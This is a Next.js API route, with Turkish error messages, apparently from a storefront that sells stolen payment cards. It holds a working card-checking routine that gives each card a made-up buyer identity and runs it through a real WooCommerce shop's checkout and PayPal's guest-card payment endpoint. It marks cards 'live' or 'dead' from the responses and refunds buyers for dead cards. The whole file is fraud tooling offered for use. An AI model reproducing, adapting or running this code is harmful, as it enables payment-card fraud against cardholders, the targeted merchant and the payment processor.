import { NextResponse } from "next/server";
import { auth } from "@/auth";
import { getPurchases, savePurchases, getUserById, updateUser } from "@/lib/db";
import { request as httpsReq } from "https";
import { IncomingMessage } from "http";

export const maxDuration = 60;

const UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";

const FIRST_NAMES = ["Ahmed","Mohamed","Fatima","Sara","Omar","Layla","Nour","Hannah","Yara","Khaled"];
const LAST_NAMES  = ["Khalil","Abdullah","Smith","Johnson","Williams","Jones","Brown","Garcia","Martinez"];
const CITIES  = ["New York","Los Angeles","Chicago","Houston","Phoenix"];
const STATES  = ["NY","CA","IL","TX","AZ"];
const STREETS = ["Main St","Park Ave","Oak St","Cedar St","Maple Ave"];
const ZIPS    = ["10001","90001","60601","77001","85001"];

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)] as T; }
function ri(a: number, b: number) { return Math.floor(Math.random() * (b - a + 1)) + a; }
function rs(n: number) {
  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length: n }, () => c[ri(0, c.length - 1)]).join("");
}

type Jar = { v: string };

function absorbCookies(jar: Jar, rawHeader: string | null) {
  if (!rawHeader) return;
  const parts = rawHeader.split(/,(?=\s*[A-Za-z0-9_\-]+=)/);
  const map = new Map<string, string>();
  for (const p of jar.v.split("; ").filter(Boolean)) {
    const i = p.indexOf("="); if (i < 0) continue;
    map.set(p.slice(0, i).trim(), p.slice(i + 1));
  }
  for (const p of parts) {
    const kv = p.trim().split(";")[0]?.trim() ?? "";
    const i = kv.indexOf("="); if (i < 0) continue;
    map.set(kv.slice(0, i).trim(), kv.slice(i + 1));
  }
  jar.v = [...map.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
}

function httpsGet(url: string, opts: {
  method?: string;
  body?: string;
  headers?: Record<string, string>;
  jar: Jar;
  maxRedirects?: number;
}): Promise<string> {
  return new Promise((resolve, reject) => {
    const MAX = opts.maxRedirects ?? 6;
    let redirects = 0;
    function doReq(target: string, method: string, body?: string) {
      const parsed = new URL(target);
      const isPost = method === "POST" && !!body;
      const reqHeaders: Record<string, string> = {
        "user-agent": UA,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        ...(opts.headers ?? {}),
        ...(isPost ? { "content-type": opts.headers?.["content-type"] ?? "application/x-www-form-urlencoded", "content-length": String(Buffer.byteLength(body!)) } : {}),
        ...(opts.jar.v ? { "cookie": opts.jar.v } : {}),
      };
      const nodeReq = httpsReq({
        hostname: parsed.hostname,
        port: parsed.port || 443,
        path: parsed.pathname + parsed.search,
        method,
        headers: reqHeaders,
        rejectUnauthorized: false,
      }, (res: IncomingMessage) => {
        const sc = res.headers["set-cookie"];
        if (sc) absorbCookies(jar, Array.isArray(sc) ? sc.join(", ") : sc);
        if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          if (redirects++ >= MAX) { reject(new Error("Too many redirects")); return; }
          const next = new URL(res.headers.location, target).toString();
          res.resume();
          doReq(next, "GET");
          return;
        }
        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(c));
        res.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
        res.on("error", reject);
      });
      nodeReq.on("error", reject);
      if (isPost && body) nodeReq.write(body);
      nodeReq.end();
    }
    doReq(url, opts.method ?? "GET", opts.body);
  });
}

function httpsJSON(url: string, body: unknown, jar: Jar): Promise<string> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const bodyStr = JSON.stringify(body);
    const nodeReq = httpsReq({
      hostname: parsed.hostname,
      port: 443,
      path: parsed.pathname + parsed.search,
      method: "POST",
      headers: {
        "user-agent": UA,
        "accept": "*/*",
        "content-type": "application/json",
        "content-length": String(Buffer.byteLength(bodyStr)),
        "origin": `https://${parsed.hostname}`,
        "referer": `https://${parsed.hostname}/checkout/`,
        ...(jar.v ? { "cookie": jar.v } : {}),
      },
      rejectUnauthorized: false,
    }, (res: IncomingMessage) => {
      const sc = res.headers["set-cookie"];
      if (sc) absorbCookies(jar, Array.isArray(sc) ? sc.join(", ") : sc);
      const chunks: Buffer[] = [];
      res.on("data", (c: Buffer) => chunks.push(c));
      res.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
      res.on("error", reject);
    });
    nodeReq.on("error", reject);
    nodeReq.write(bodyStr);
    nodeReq.end();
  });
}

async function processCard(cardData: string): Promise<"live" | "dead"> {
  const parts = cardData.split("|").map((p) => p.trim());
  if (parts.length < 4) return "dead";

  let n   = parts[0] ?? "";
  let mm  = parts[1] ?? "";
  let yy  = parts[2] ?? "";
  const cvc = parts[3] ?? "";

  if (!/^\d{13,19}$/.test(n)) return "dead";
  if (mm.length === 1) mm = "0" + mm;
  if (yy.length === 4) yy = yy.slice(2);
  if (cvc === "000") return "dead";

  const firstName = pick(FIRST_NAMES);
  const lastName  = pick(LAST_NAMES);
  const cityIdx   = ri(0, CITIES.length - 1);
  const city  = CITIES[cityIdx] ?? "New York";
  const state = STATES[cityIdx] ?? "NY";
  const zip   = ZIPS[cityIdx] ?? "10001";
  const street = `${ri(1, 999)} ${pick(STREETS)}`;
  const email  = `${rs(16)}${ri(1000,9999)}@gmail.com`;
  const phone  = `303${ri(1000000,9999999)}`;

  const jar: Jar = { v: "" };

  try {
    await httpsGet("https://switchupcb.com/shop/i-buy/", {
      jar,
      method: "POST",
      body: "quantity=1&add-to-cart=4451",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://switchupcb.com",
        "referer": "https://switchupcb.com/shop/i-buy/",
      },
    });

    const html = await httpsGet("https://switchupcb.com/checkout/", {
      jar,
      headers: { "referer": "https://switchupcb.com/cart/" },
    });

    const sec    = html.match(/["']?update_order_review_nonce["']?\s*:\s*["']([a-f0-9]+)["']/)?.[1];
    const check  = html.match(/name=["']woocommerce-process-checkout-nonce["']\s+value=["']([a-f0-9]+)["']/)?.[1];
    const create = html.match(/["']?create_order["']?[^}]*?["']?nonce["']?\s*:\s*["']([a-f0-9]+)["']/)?.[1];

    if (!sec || !check) return "dead";
    const useCreate = create ?? rs(10);

    const reviewBody = `security=${encodeURIComponent(sec)}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=${encodeURIComponent(`billing_first_name=${firstName}&billing_last_name=${lastName}&billing_country=US&billing_address_1=New York&billing_city=New York&billing_state=NY&billing_postcode=10080&billing_phone=${phone}&billing_email=${email}&payment_method=stripe&woocommerce-process-checkout-nonce=${check}`)}`;

    await httpsGet("https://switchupcb.com/?wc-ajax=update_order_review", {
      jar,
      method: "POST",
      body: reviewBody,
      headers: {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://switchupcb.com",
        "referer": "https://switchupcb.com/checkout/",
      },
    });

    const orderRaw = await httpsJSON("https://switchupcb.com/?wc-ajax=ppc-create-order", {
      nonce: useCreate,
      payer: null,
      bn_code: "Woo_PPCP",
      context: "checkout",
      order_id: "0",
      payment_method: "ppcp-gateway",
      funding_source: "card",
      form_encoded: `billing_first_name=${firstName}&billing_last_name=${lastName}&billing_country=US&billing_address_1=${encodeURIComponent(street)}&billing_city=${city}&billing_state=${state}&billing_postcode=${zip}&billing_phone=${phone}&billing_email=${encodeURIComponent(email)}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=${check}`,
      createaccount: false,
      save_payment_method: false,
    }, jar);

    let orderId: string | undefined;
    try {
      const parsed = JSON.parse(orderRaw) as { data?: { id?: string }; id?: string };
      orderId = parsed?.data?.id ?? parsed?.id;
    } catch { return "dead"; }

    if (!orderId) return "dead";

    const gqlRaw = await httpsJSON("https://www.paypal.com/graphql?fetch_credit_form_submit", {
      query: `mutation payWithCard($token:String!$card:CardInput!$firstName:String$lastName:String$billingAddress:AddressInput$email:String$currencyConversionType:CheckoutCurrencyConversionType){approveGuestPaymentWithCreditCard(token:$token card:$card firstName:$firstName lastName:$lastName email:$email billingAddress:$billingAddress currencyConversionType:$currencyConversionType){flags{is3DSecureRequired}cart{intent cartId}paymentContingencies{threeDomainSecure{status}}}}`,
      variables: {
        token: orderId,
        card: { cardNumber: n, type: "VISA", expirationDate: `${mm}/20${yy}`, postalCode: zip, securityCode: cvc },
        firstName, lastName,
        billingAddress: { givenName: firstName, familyName: lastName, line1: "New York", line2: null, city: "New York", state: "NY", postalCode: "10080", country: "US" },
        email,
        currencyConversionType: "VENDOR",
      },
      operationName: null,
    }, jar);

    if (
      gqlRaw.includes("ADD_SHIPPING_ERROR") || gqlRaw.includes("NEED_CREDIT_CARD") ||
      gqlRaw.includes('"status":"succeeded"') || gqlRaw.includes("Thank You For Donation") ||
      gqlRaw.includes("Success ") || gqlRaw.includes("is3DSecureRequired") ||
      gqlRaw.includes('"OTP"') || gqlRaw.includes("INVALID_SECURITY_CODE") ||
      gqlRaw.includes("INVALID_BILLING_ADDRESS") || gqlRaw.includes("EXISTING_ACCOUNT_RESTRICTED")
    ) return "live";

    return "dead";
  } catch { return "dead"; }
}

export async function POST(req: Request) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Giriş gerekli." }, { status: 401 });

  const { purchaseId } = await req.json() as { purchaseId?: string };
  if (!purchaseId) return NextResponse.json({ error: "Satın alım ID gerekli." }, { status: 400 });

  const purchases = getPurchases();
  const idx = purchases.findIndex((p) => p.id === purchaseId);
  if (idx === -1) return NextResponse.json({ error: "Satın alım bulunamadı." }, { status: 404 });

  const purchase = purchases[idx]!;
  if (purchase.userId !== session.user.id) return NextResponse.json({ error: "Yetkisiz." }, { status: 403 });

  // Allow re-check only if unchecked
  if (purchase.checkStatus !== "unchecked") {
    return NextResponse.json({ status: purchase.checkStatus });
  }

  const cardLine = `${purchase.cardNumber}|${purchase.month}|${purchase.year}|${purchase.cvv}`;
  const status = await processCard(cardLine);

  // Save result
  purchases[idx] = { ...purchase, checkStatus: status };
  savePurchases(purchases);

  // Always refund if dead
  if (status === "dead") {
    const user = getUserById(purchase.userId);
    if (user) updateUser(user.id, { balance: user.balance + purchase.pricePaid });
  }

  return NextResponse.json({ status });
}
